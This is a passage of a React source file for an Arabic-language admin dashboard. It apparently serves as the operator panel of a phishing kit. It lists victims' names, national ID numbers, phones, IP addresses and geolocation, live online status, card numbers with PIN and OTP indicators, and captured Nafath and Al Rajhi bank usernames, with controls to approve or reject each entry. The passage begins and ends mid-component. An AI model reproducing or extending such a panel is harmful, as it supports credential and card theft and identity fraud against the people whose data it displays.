              </SelectContent>
            </Select>
            <span>من أصل {filteredNotifications.length} عنصر</span>
          </div>

          <div className="text-gray-500">
            عرض {startIndex + 1} إلى {Math.min(endIndex, filteredNotifications.length)} من{" "}
            {filteredNotifications.length}
          </div>
        </div>

        <div className="flex items-center gap-2">
          <Button
            variant="outline"
            size="sm"
            onClick={() => handlePageChange(1)}
            disabled={currentPage === 1}
            className="h-8 w-8 p-0 border-gray-200 hover:bg-gray-50"
          >
            <ChevronsRight className="h-4 w-4" />
          </Button>

          <Button
            variant="outline"
            size="sm"
            onClick={() => handlePageChange(currentPage - 1)}
            disabled={currentPage === 1}
            className="h-8 w-8 p-0 border-gray-200 hover:bg-gray-50"
          >
            <ChevronRight className="h-4 w-4" />
          </Button>

          <div className="flex items-center gap-1">
            {getPageNumbers().map((page, index) => (
              <React.Fragment key={index}>
                {page === "..." ? (
                  <span className="px-2 py-1 text-gray-400">...</span>
                ) : (
                  <Button
                    variant={currentPage === page ? "default" : "outline"}
                    size="sm"
                    onClick={() => handlePageChange(page as number)}
                    className={`h-8 w-8 p-0 ${
                      currentPage === page
                        ? "bg-indigo-600 text-white hover:bg-indigo-700"
                        : "border-gray-200 hover:bg-gray-50"
                    }`}
                  >
                    {page}
                  </Button>
                )}
              </React.Fragment>
            ))}
          </div>

          <Button
            variant="outline"
            size="sm"
            onClick={() => handlePageChange(currentPage + 1)}
            disabled={currentPage === totalPages}
            className="h-8 w-8 p-0 border-gray-200 hover:bg-gray-50"
          >
            <ChevronLeft className="h-4 w-4" />
          </Button>

          <Button
            variant="outline"
            size="sm"
            onClick={() => handlePageChange(totalPages)}
            disabled={currentPage === totalPages}
            className="h-8 w-8 p-0 border-gray-200 hover:bg-gray-50"
          >
            <ChevronsLeft className="h-4 w-4" />
          </Button>
        </div>
      </div>
    )
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-gray-50 to-zinc-50 dark:from-slate-900 dark:via-gray-900 dark:to-zinc-900">
        <div className="container mx-auto px-6 py-8">
          <div className="mb-8">
            <Skeleton className="h-12 w-80 mb-4" />
            <Skeleton className="h-6 w-96" />
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-6 mb-8">
            {[1, 2, 3, 4, 5].map((i) => (
              <Card key={i} className="border-0 shadow-lg bg-white/80">
                <CardContent className="p-6">
                  <Skeleton className="h-4 w-20 mb-2" />
                  <Skeleton className="h-8 w-16 mb-4" />
                  <Skeleton className="h-2 w-full" />
                </CardContent>
              </Card>
            ))}
          </div>

          <Card className="border-0 shadow-xl bg-white/90">
            <CardHeader className="pb-6">
              <Skeleton className="h-8 w-64 mb-4" />
              <div className="flex gap-4">
                <Skeleton className="h-10 w-80" />
                <Skeleton className="h-10 w-32" />
              </div>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                {[1, 2, 3, 4, 5].map((i) => (
                  <div key={i} className="flex items-center justify-between p-4 rounded-lg border">
                    <div className="flex items-center gap-4">
                      <Skeleton className="h-10 w-10 rounded-full" />
                      <div className="space-y-2">
                        <Skeleton className="h-4 w-40" />
                        <Skeleton className="h-3 w-24" />
                      </div>
                    </div>
                    <Skeleton className="h-8 w-24 rounded-md" />
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    )
  }

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-slate-50 via-gray-50 to-zinc-50 dark:from-slate-900 dark:via-gray-900 dark:to-zinc-900"
    >
      <Toaster richColors closeButton position="top-center" />

      {/* Modern Professional Header */}
      <header className="sticky top-0 z-50 border-b border-gray-200/50 bg-white/95 backdrop-blur-lg shadow-sm">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-3">
                <div className="p-2.5 rounded-xl bg-gradient-to-br from-indigo-600 to-purple-600 shadow-lg">
                  <LayoutDashboard className="h-6 w-6 text-white" />
                </div>
                <div>
                  <h1 className="text-2xl font-semibold bg-gradient-to-r from-gray-900 to-gray-700 text-transparent bg-clip-text">
                    لوحة التحكم الاحترافية
                  </h1>
                  <p className="text-sm text-gray-600 mt-0.5">إدارة البيانات والإشعارات مع تتبع الموقع والحالة</p>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-3">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={refreshData}
                      disabled={isRefreshing}
                      className="gap-2 border-gray-200 hover:bg-gray-50 transition-all duration-200 bg-transparent"
                    >
                      {isRefreshing ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
                      <span className="hidden sm:inline">تحديث</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>تحديث البيانات</TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="outline" size="sm" className="gap-2 border-gray-200 hover:bg-gray-50 bg-transparent">
                    <Settings className="h-4 w-4" />
                    <span className="hidden sm:inline">الإعدادات</span>
                    <ChevronDown className="h-3 w-3" />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end" className="w-48">
                  <DropdownMenuLabel>خيارات المستخدم</DropdownMenuLabel>
                  <DropdownMenuSeparator />
                  <DropdownMenuItem className="gap-2">
                    <User className="h-4 w-4" />
                    الملف الشخصي
                  </DropdownMenuItem>
                  <DropdownMenuItem className="gap-2">
                    <Download className="h-4 w-4" />
                    تصدير البيانات
                  </DropdownMenuItem>
                  <DropdownMenuSeparator />
                  <DropdownMenuItem onClick={handleLogout} className="gap-2 text-red-600">
                    <LogOut className="h-4 w-4" />
                    تسجيل الخروج
                  </DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-6 py-8">
        {/* Enhanced Analytics Dashboard */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-6 mb-8">
          <Card className="border-0 shadow-lg bg-gradient-to-br from-blue-50 to-indigo-50 hover:shadow-xl transition-all duration-300">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm font-medium text-blue-700 mb-1">إجمالي الطلبات</p>
                  <p className="text-3xl font-bold text-blue-900">{totalNotifications}</p>
                  <p className="text-xs text-blue-600 mt-1 flex items-center gap-1">
                    <TrendingUp className="h-3 w-3" />
                    نشط
                  </p>
                </div>
                <div className="p-3 rounded-full bg-blue-100">
                  <Bell className="h-6 w-6 text-blue-600" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-emerald-50 to-green-50 hover:shadow-xl transition-all duration-300">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm font-medium text-emerald-700 mb-1">المتصلون الآن</p>
                  <p className="text-3xl font-bold text-emerald-900">{onlineUsers}</p>
                  <p className="text-xs text-emerald-600 mt-1 flex items-center gap-1">
                    <Wifi className="h-3 w-3" />
                    {totalNotifications > 0 ? Math.round((onlineUsers / totalNotifications) * 100) : 0}%
                  </p>
                </div>
                <div className="p-3 rounded-full bg-emerald-100">
                  <Wifi className="h-6 w-6 text-emerald-600" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-amber-50 to-orange-50 hover:shadow-xl transition-all duration-300">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm font-medium text-amber-700 mb-1">قيد الانتظار</p>
                  <p className="text-3xl font-bold text-amber-900">{pendingNotifications}</p>
                  <p className="text-xs text-amber-600 mt-1 flex items-center gap-1">
                    <Clock className="h-3 w-3" />
                    {totalNotifications > 0 ? Math.round((pendingNotifications / totalNotifications) * 100) : 0}%
                  </p>
                </div>
                <div className="p-3 rounded-full bg-amber-100">
                  <Clock className="h-6 w-6 text-amber-600" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-emerald-50 to-green-50 hover:shadow-xl transition-all duration-300">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm font-medium text-emerald-700 mb-1">مقبول</p>
                  <p className="text-3xl font-bold text-emerald-900">{approvedNotifications}</p>
                  <p className="text-xs text-emerald-600 mt-1 flex items-center gap-1">
                    <CheckCircle className="h-3 w-3" />
                    {totalNotifications > 0 ? Math.round((approvedNotifications / totalNotifications) * 100) : 0}%
                  </p>
                </div>
                <div className="p-3 rounded-full bg-emerald-100">
                  <CheckCircle className="h-6 w-6 text-emerald-600" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-red-50 to-rose-50 hover:shadow-xl transition-all duration-300">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm font-medium text-red-700 mb-1">مرفوض</p>
                  <p className="text-3xl font-bold text-red-900">{rejectedNotifications}</p>
                  <p className="text-xs text-red-600 mt-1 flex items-center gap-1">
                    <XCircle className="h-3 w-3" />
                    {totalNotifications > 0 ? Math.round((rejectedNotifications / totalNotifications) * 100) : 0}%
                  </p>
                </div>
                <div className="p-3 rounded-full bg-red-100">
                  <XCircle className="h-6 w-6 text-red-600" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Main Data Table */}
        <Card className="border-0 shadow-xl bg-white/90 backdrop-blur-sm">
          <CardHeader className="bg-gradient-to-r from-gray-50 to-slate-50 border-b border-gray-200/50 pb-6">
            <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4">
              <div>
                <CardTitle className="text-2xl font-semibold text-gray-900 mb-2">جدول البيانات الاحترافي</CardTitle>
                <p className="text-gray-600">إدارة وتتبع جميع الطلبات والإشعارات مع معلومات الموقع والحالة الحقيقية</p>
              </div>

              <div className="flex flex-wrap gap-3">
                <Button
                  onClick={handleClearAll}
                  disabled={notifications.length === 0}
                  className="gap-2 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white shadow-lg"
                >
                  <Trash2 className="h-4 w-4" />
                  مسح الكل
                </Button>

                <Button variant="outline" className="gap-2 border-gray-200 hover:bg-gray-50 bg-transparent">
                  <Download className="h-4 w-4" />
                  تصدير
                </Button>

                <Button variant="outline" className="gap-2 border-gray-200 hover:bg-gray-50 bg-transparent">
                  <Plus className="h-4 w-4" />
                  إضافة جديد
                </Button>
              </div>
            </div>

            {/* Enhanced Search and Filters */}
            <div className="mt-6 space-y-4">
              <div className="flex flex-col md:flex-row gap-4">
                <div className="relative flex-1">
                  <Search className="absolute right-3 top-3 h-4 w-4 text-gray-400" />
                  <Input
                    placeholder="البحث بالاسم، رقم الهاتف، رقم البطاقة، الدولة، المدينة، أو عنوان IP..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="pr-10 h-12 border-gray-200 focus:border-indigo-400 focus:ring-indigo-400 bg-white shadow-sm"
                  />
                </div>

                <Select value={sortOrder} onValueChange={handleSortChange}>
                  <SelectTrigger className="w-full md:w-48 h-12 border-gray-200 focus:border-indigo-400 bg-white shadow-sm">
                    <SelectValue placeholder="ترتيب حسب" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="newest">الأحدث أولاً</SelectItem>
                    <SelectItem value="oldest">الأقدم أولاً</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {/* Professional Filter Buttons */}
              <div className="flex flex-wrap gap-2">
                <Button
                  variant={activeFilter === null ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter(null)}
                  className={`transition-all duration-200 ${
                    activeFilter === null
                      ? "bg-indigo-600 text-white shadow-md hover:bg-indigo-700"
                      : "border-gray-200 hover:bg-gray-50"
                  }`}
                >
                  الكل ({totalNotifications})
                </Button>

                <Button
                  variant={activeFilter === "online" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("online")}
                  className={`transition-all duration-200 ${
                    activeFilter === "online"
                      ? "bg-emerald-500 text-white shadow-md"
                      : "border-emerald-200 text-emerald-700 hover:bg-emerald-50"
                  }`}
                >
                  <Wifi className="h-3.5 w-3.5 ml-1" />
                  متصل ({onlineUsers})
                </Button>

                <Button
                  variant={activeFilter === "offline" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("offline")}
                  className={`transition-all duration-200 ${
                    activeFilter === "offline"
                      ? "bg-gray-500 text-white shadow-md"
                      : "border-gray-200 text-gray-700 hover:bg-gray-50"
                  }`}
                >
                  <WifiOff className="h-3.5 w-3.5 ml-1" />
                  غير متصل ({totalNotifications - onlineUsers})
                </Button>

                <Button
                  variant={activeFilter === "pending" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("pending")}
                  className={`transition-all duration-200 ${
                    activeFilter === "pending"
                      ? "bg-amber-500 text-white shadow-md"
                      : "border-amber-200 text-amber-700 hover:bg-amber-50"
                  }`}
                >
                  <Clock className="h-3.5 w-3.5 ml-1" />
                  قيد الانتظار ({pendingNotifications})
                </Button>

                <Button
                  variant={activeFilter === "approved" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("approved")}
                  className={`transition-all duration-200 ${
                    activeFilter === "approved"
                      ? "bg-emerald-500 text-white shadow-md"
                      : "border-emerald-200 text-emerald-700 hover:bg-emerald-50"
                  }`}
                >
                  <CheckCircle className="h-3.5 w-3.5 ml-1" />
                  مقبول ({approvedNotifications})
                </Button>

                <Button
                  variant={activeFilter === "rejected" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("rejected")}
                  className={`transition-all duration-200 ${
                    activeFilter === "rejected"
                      ? "bg-red-500 text-white shadow-md"
                      : "border-red-200 text-red-700 hover:bg-red-50"
                  }`}
                >
                  <XCircle className="h-3.5 w-3.5 ml-1" />
                  مرفوض ({rejectedNotifications})
                </Button>

                <Button
                  variant={activeFilter === "payment" ? "default" : "outline"}
                  size="sm"
                  onClick={() => applyFilter("payment")}
                  className={`transition-all duration-200 ${
                    activeFilter === "payment"
                      ? "bg-blue-500 text-white shadow-md"
                      : "border-blue-200 text-blue-700 hover:bg-blue-50"
                  }`}
                >
                  <CreditCard className="h-3.5 w-3.5 ml-1" />
                  دفع
                </Button>
              </div>

              {/* Progress Bar for Completion Rate */}
              <div className="bg-white rounded-lg p-4 border border-gray-200 shadow-sm">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-sm font-medium text-gray-700">معدل الإنجاز</span>
                  <span className="text-sm font-bold text-gray-900">{completionRate}%</span>
                </div>
                <Progress value={completionRate} className="h-2" />
                <p className="text-xs text-gray-500 mt-1">
                  تم معالجة {approvedNotifications + rejectedNotifications} من أصل {totalNotifications} طلب
                </p>
              </div>
            </div>
          </CardHeader>

          <CardContent className="p-0">
            {filteredNotifications.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-20">
                <div className="w-32 h-32 rounded-full bg-gradient-to-br from-gray-100 to-gray-200 flex items-center justify-center mb-6">
                  <AlertCircle className="h-16 w-16 text-gray-400" />
                </div>
                <h3 className="text-2xl font-semibold text-gray-900 mb-3">لا توجد بيانات</h3>
                <p className="text-gray-600 max-w-md text-center mb-6 leading-relaxed">
                  {searchTerm || activeFilter
                    ? "لم يتم العثور على نتائج مطابقة لمعايير البحث. يرجى تعديل معايير البحث أو المرشحات."
                    : "ستظهر الطلبات والإشعارات الجديدة هنا عند وصولها إلى النظام."}
                </p>
                {(searchTerm || activeFilter) && (
                  <Button
                    onClick={() => {
                      setSearchTerm("")
                      setActiveFilter(null)
                    }}
                    className="bg-gradient-to-r from-indigo-500 to-purple-500 hover:from-indigo-600 hover:to-purple-600 text-white shadow-lg"
                  >
                    إعادة ضبط البحث
                  </Button>
                )}
              </div>
            ) : (
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="bg-gradient-to-r from-gray-50 via-slate-50 to-gray-50 hover:from-gray-100 hover:via-slate-100 hover:to-gray-100 border-b-2 border-gray-200">
                      <TableHead className="text-right font-bold text-gray-800 py-4">
                        <div className="flex items-center gap-2">
                          <Tag className="h-4 w-4" />
                          نوع الطلب
                          <ArrowUpDown className="h-3 w-3 text-gray-400" />
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold text-gray-800 py-4">
                        <div className="flex items-center gap-2">
                          <User className="h-4 w-4" />
                          المستخدم
                          <ArrowUpDown className="h-3 w-3 text-gray-400" />
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold text-gray-800 py-4">
                        <div className="flex items-center gap-2">
                          <Wifi className="h-4 w-4" />
                          الحالة
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold text-gray-800 py-4">
                        <div className="flex items-center gap-2">
                          <Globe className="h-4 w-4" />
                          الدولة
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold text-gray-800 py-4">
                        <div className="flex items-center gap-2">
                          <CreditCard className="h-4 w-4" />
                          البطاقة
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold text-gray-800 py-4">
                        <div className="flex items-center gap-2">
                          <Activity className="h-4 w-4" />
                          الإجراءات
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold text-gray-800 py-4">
                        <div className="flex items-center gap-2">
                          <Zap className="h-4 w-4" />
                          حالة الطلب
                        </div>
                      </TableHead>
                      <TableHead className="text-right font-bold text-gray-800 py-4">
                        <div className="flex items-center gap-2">
                          <Calendar className="h-4 w-4" />
                          التاريخ
                          <ArrowUpDown className="h-3 w-3 text-gray-400" />
                        </div>
                      </TableHead>
                      <TableHead className="text-center font-bold text-gray-800 py-4">العمليات</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {paginatedNotifications.map((notification, index) => (
                      <TableRow
                        key={notification.id}
                        className={`hover:bg-gradient-to-r hover:from-indigo-50/50 hover:to-purple-50/50 border-b border-gray-100 cursor-pointer transition-all duration-300 ${
                          index % 2 === 0 ? "bg-white" : "bg-gray-50/30"
                        }`}
                        onClick={() => handleViewDetails(notification)}
                      >
                        <TableCell className="py-4">{getPageType(notification.pagename, true, notification)}</TableCell>

                        <TableCell className="py-4">
                          <div className="flex items-center gap-3">
                            <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-indigo-100 to-purple-100 flex items-center justify-center shadow-sm">
                              <User className="h-5 w-5 text-indigo-600" />
                            </div>
                            <div>
                              <Badge
                                className="bg-gradient-to-r from-gray-100 to-slate-100 text-gray-800 border-gray-200 hover:from-gray-200 hover:to-slate-200 font-medium px-3 py-1 shadow-sm cursor-pointer transition-all duration-200"
                                onClick={(e) => {
                                  e.stopPropagation()
                                  handleInfoClick(notification, "personal")
                                }}
                              >
                                {notification.documment_owner_full_name ||
                                  notification.document_owner_full_name ||
                                  "غير محدد"}
                              </Badge>
                              <p className="text-xs text-gray-500 mt-1">
                                {notification.phone ? `هاتف: ${notification.phone}` : ""}
                              </p>
                            </div>
                          </div>
                        </TableCell>

                        <TableCell className="py-4">
                          <div className="flex flex-col gap-1">
<UserStatus userId={notification?.id}/>
                            {notification.ipAddress && (
                              <p className="text-xs text-gray-500 font-mono">{notification.ipAddress}</p>
                            )}
                          </div>
                        </TableCell>

                        <TableCell className="py-4">
                          <div className="flex flex-col gap-1">
                            {getCountryBadge(notification)}
                            {notification.city && (
                              <p className="text-xs text-gray-500 flex items-center gap-1">
                                <MapPin className="h-3 w-3" />
                                {notification.city}
                              </p>
                            )}
                          </div>
                        </TableCell>

                        <TableCell className="py-4">
                          <Badge
                            className={`cursor-pointer transition-all duration-300 font-medium px-3 py-1 shadow-sm ${
                              notification.cardNumber
                                ? notification.pinCode
                                  ? "bg-gradient-to-r from-emerald-100 to-green-100 text-emerald-800 border-emerald-200 hover:from-emerald-200 hover:to-green-200"
                                  : notification.otpCode
                                    ? "animate-pulse bg-gradient-to-r from-blue-100 to-indigo-100 text-blue-800 border-blue-200 hover:from-blue-200 hover:to-indigo-200"
                                    : "bg-gradient-to-r from-amber-100 to-orange-100 text-amber-800 border-amber-200 hover:from-amber-200 hover:to-orange-200"
                                : "bg-gradient-to-r from-red-100 to-rose-100 text-red-800 border-red-200 hover:from-red-200 hover:to-rose-200"
                            }`}
                            onClick={(e) => handleCardBadgeClick(notification, e)}
                          >
                            <CardIcon className="h-3.5 w-3.5 mr-1.5" />
                            {notification.cardNumber ? "بيانات متوفرة" : "غير متوفر"}
                          </Badge>
                        </TableCell>

                        <TableCell className="py-4">
                          <div className="flex items-center gap-2 flex-wrap">
                            {notification?.nafadUsername && (
                              <Badge
                                onClick={(e) => {
                                  e.stopPropagation()
                                  setSelectedNotification(notification)
                                  setShowNafazDialog(true)
                                }}
                                className="bg-gradient-to-r from-teal-100 to-cyan-100 text-teal-800 border-teal-200 hover:from-teal-200 hover:to-cyan-200 cursor-pointer font-medium px-2 py-1 shadow-sm transition-all duration-200"
                              >
                                نفاذ
                              </Badge>
                            )}
                            {notification?.externalUsername && (
                              <Badge
                                className="cursor-pointer bg-gradient-to-r from-emerald-100 to-green-100 text-emerald-800 border-emerald-200 hover:from-emerald-200 hover:to-green-200 font-medium px-2 py-1 shadow-sm transition-all duration-200"
                                onClick={(e) => {
                                  e.stopPropagation()
                                  setSelectedNotification(notification)
                                  setShowRajhiDialog(true)
                                }}
                              >
                                راجحي
                              </Badge>
                            )}
                            {notification.phone2 && (
                              <Badge
                                className={`cursor-pointer font-medium px-2 py-1 shadow-sm transition-all duration-200 ${
                                  notification.phoneVerificationStatus === "pending" ? "animate-pulse" : ""
                                } ${
                                  notification.otpCode
                                    ? "bg-gradient-to-r from-pink-100 to-rose-100 text-pink-800 border-pink-200 hover:from-pink-200 hover:to-rose-200"
                                    : "bg-gradient-to-r from-slate-100 to-gray-100 text-slate-800 border-slate-200 hover:from-slate-200 hover:to-gray-200"
                                }`}
                                onClick={(e) => {
                                  e.stopPropagation()
                                  setSelectedNotification(notification)
                                  setPhoneDialog(true)
                                }}
                              >
                                {notification.phone2}
                              </Badge>
                            )}
                          </div>
                        </TableCell>

                        <TableCell className="py-4">{getStatusBadge(notification.status)}</TableCell>

                        <TableCell className="py-4">
                          <div className="flex flex-col">
                            <span className="text-sm font-medium text-gray-900">
                              {format(new Date(notification.createdDate as any), "yyyy/MM/dd")}
                            </span>
                            <span className="text-xs text-gray-500">
                              {format(new Date(notification?.createdDate as any), "HH:mm")}
                            </span>
                          </div>
                        </TableCell>

                        <TableCell className="py-4">
                          <div className="flex justify-center gap-1">
                            <TooltipProvider>
                              <Tooltip>
                                <TooltipTrigger asChild>
                                  <Button
                                    variant="ghost"
                                    size="icon"
                                    className="h-9 w-9 rounded-lg hover:bg-indigo-100 hover:text-indigo-700 transition-all duration-200"
                                    onClick={(e) => {
                                      e.stopPropagation()
                                      handleViewDetails(notification)
                                    }}
                                  >
                                    <Eye className="h-4 w-4" />
                                  </Button>
                                </TooltipTrigger>
                                <TooltipContent>عرض التفاصيل</TooltipContent>
                              </Tooltip>
                            </TooltipProvider>

                            <DropdownMenu>
                              <DropdownMenuTrigger asChild onClick={(e) => e.stopPropagation()}>
                                <Button
                                  variant="ghost"
                                  size="icon"
                                  className="h-9 w-9 rounded-lg hover:bg-gray-100 hover:text-gray-700 transition-all duration-200"
                                >
                                  <MoreHorizontal className="h-4 w-4" />
                                </Button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent
                                align="end"
                                className="w-48 bg-white/95 backdrop-blur-sm border-0 shadow-xl"
                              >
                                <DropdownMenuLabel className="text-gray-900">خيارات متقدمة</DropdownMenuLabel>
                                <DropdownMenuSeparator />
                                <DropdownMenuItem
                                  onClick={(e) => {
                                    e.stopPropagation()
                                    handleInfoClick(notification, "personal")
                                  }}
                                  className="gap-2 hover:bg-indigo-50"
                                >
                                  <User className="h-4 w-4" />
                                  معلومات شخصية
                                </DropdownMenuItem>
                                {(notification.cardNumber ||
                                  (notification.formData && notification.formData.cardNumber)) && (
                                  <DropdownMenuItem
                                    onClick={(e) => {
                                      e.stopPropagation()
                                      handleInfoClick(notification, "card")
                                    }}
                                    className="gap-2 hover:bg-blue-50"
                                  >
                                    <CreditCard className="h-4 w-4" />
                                    معلومات البطاقة
                                  </DropdownMenuItem>
                                )}
                                {notification.vehicle_type && (
                                  <DropdownMenuItem
                                    onClick={(e) => {
                                      e.stopPropagation()
                                      handleInfoClick(notification, "vehicle")
                                    }}
                                    className="gap-2 hover:bg-purple-50"
                                  >
                                    <Car className="h-4 w-4" />
                                    معلومات المركبة
                                  </DropdownMenuItem>
                                )}
                                <DropdownMenuSeparator />
                                <DropdownMenuItem
                                  onClick={(e) => {
                                    e.stopPropagation()
                                    handleDelete(notification.id)
                                  }}
                                  className="gap-2 text-red-600 hover:text-red-700 hover:bg-red-50"
                                >
                                  <Trash2 className="h-4 w-4" />
                                  حذف نهائي
                                </DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>
                          </div>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            )}
          </CardContent>

          {/* Professional Pagination Component */}
          {filteredNotifications.length > 0 && <PaginationComponent />}
        </Card>
      </div>

      {/* Enhanced Info Dialog with Real Location Information */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-white/98 backdrop-blur-md border-0 shadow-2xl max-w-lg rounded-2xl" dir="rtl">
          <DialogHeader className="border-b border-gray-100 pb-6">
            <DialogTitle className="text-2xl font-bold bg-gradient-to-r from-indigo-600 to-purple-600 text-transparent bg-clip-text">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات المركبة"}
            </DialogTitle>
            <DialogDescription className="text-gray-600 mt-2">
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية والهوية والموقع الحقيقي للمستخدم"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات البطاقة البنكية والدفع"
                  : "تفاصيل معلومات المركبة والتسجيل"}
            </DialogDescription>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-4 py-4">
              <div className="p-5 rounded-xl bg-gradient-to-br from-indigo-50 to-blue-50 border border-indigo-100 shadow-sm">
                <div className="flex items-center gap-3 mb-3">
                  <div className="p-2 rounded-lg bg-indigo-100">
                    <User className="h-5 w-5 text-indigo-600" />
                  </div>
                  <p className="text-sm font-semibold text-indigo-800">الاسم الكامل</p>
                </div>
                <p className="font-bold text-xl text-gray-900">
                  {selectedNotification.documment_owner_full_name ||
                    selectedNotification.document_owner_full_name ||
                    "غير محدد"}
                </p>
              </div>

              <div className="p-5 rounded-xl bg-gradient-to-br from-emerald-50 to-green-50 border border-emerald-100 shadow-sm">
                <div className="flex items-center gap-3 mb-3">
                  <div className="p-2 rounded-lg bg-emerald-100">
                    <Shield className="h-5 w-5 text-emerald-600" />
                  </div>
                  <p className="text-sm font-semibold text-emerald-800">رقم الهوية</p>
                </div>
                <p className="font-bold text-xl font-mono text-gray-900">
                  {selectedNotification.owner_identity_number ||
                    selectedNotification.buyer_identity_number ||
                    "غير محدد"}
                </p>
              </div>

              <div className="p-5 rounded-xl bg-gradient-to-br from-purple-50 to-pink-50 border border-purple-100 shadow-sm">
                <div className="flex items-center gap-3 mb-3">
                  <div className="p-2 rounded-lg bg-purple-100">
                    <Smartphone className="h-5 w-5 text-purple-600" />
                  </div>
                  <p className="text-sm font-semibold text-purple-800">رقم الهاتف</p>
                </div>
                <p className="font-bold text-xl font-mono text-gray-900">{selectedNotification.phone || "غير محدد"}</p>
              </div>

              {/* Real Online Status and Location Information */}
              <div className="p-5 rounded-xl bg-gradient-to-br from-cyan-50 to-blue-50 border border-cyan-100 shadow-sm">
                <div className="flex items-center gap-3 mb-3">
                  <div className="p-2 rounded-lg bg-cyan-100">
                    <Wifi className="h-5 w-5 text-cyan-600" />
                  </div>
                  <p className="text-sm font-semibold text-cyan-800">حالة الاتصال</p>
                </div>
                <div className="space-y-2">
                <UserStatus userId={selectedNotification.id}/>                   {selectedNotification.ipAddress && (
                    <p className="text-sm font-mono text-gray-700">IP: {selectedNotification.ipAddress}</p>
                  )}
                  {selectedNotification.userAgent && (
                    <p className="text-xs text-gray-600">المتصفح: {selectedNotification.userAgent}</p>
                  )}
                </div>
              </div>

              <div className="p-5 rounded-xl bg-gradient-to-br from-orange-50 to-amber-50 border border-orange-100 shadow-sm">
                <div className="flex items-center gap-3 mb-3">
                  <div className="p-2 rounded-lg bg-orange-100">
                    <Globe className="h-5 w-5 text-orange-600" />
                  </div>
                  <p className="text-sm font-semibold text-orange-800">معلومات الموقع الحقيقية</p>
                </div>
                <div className="space-y-2">
                  {getCountryBadge(selectedNotification)}
                  {selectedNotification.city && (
                    <p className="text-sm text-gray-700 flex items-center gap-1">
                      <MapPin className="h-4 w-4" />
                      {selectedNotification.city}
                      {selectedNotification.region && `, ${selectedNotification.region}`}
                    </p>
                  )}
                  {selectedNotification.latitude && selectedNotification.longitude && (
                    <p className="text-xs text-gray-600 font-mono">
                      الإحداثيات: {selectedNotification.latitude.toFixed(4)},{" "}
                      {selectedNotification.longitude.toFixed(4)}
                    </p>
                  )}
                </div>
              </div>

              <div className="p-5 rounded-xl bg-gradient-to-br from-amber-50 to-orange-50 border border-amber-100 shadow-sm">
                <div className="flex items-center gap-3 mb-3">
                  <div className="p-2 rounded-lg bg-amber-100">
                    <Tag className="h-5 w-5 text-amber-600" />
                  </div>
                  <p className="text-sm font-semibold text-amber-800">نوع الطلب</p>
                </div>
                <p className="font-medium text-lg text-gray-900">
                  {selectedNotification.pagename || selectedNotification.insurance_purpose || "غير محدد"}
                </p>
              </div>

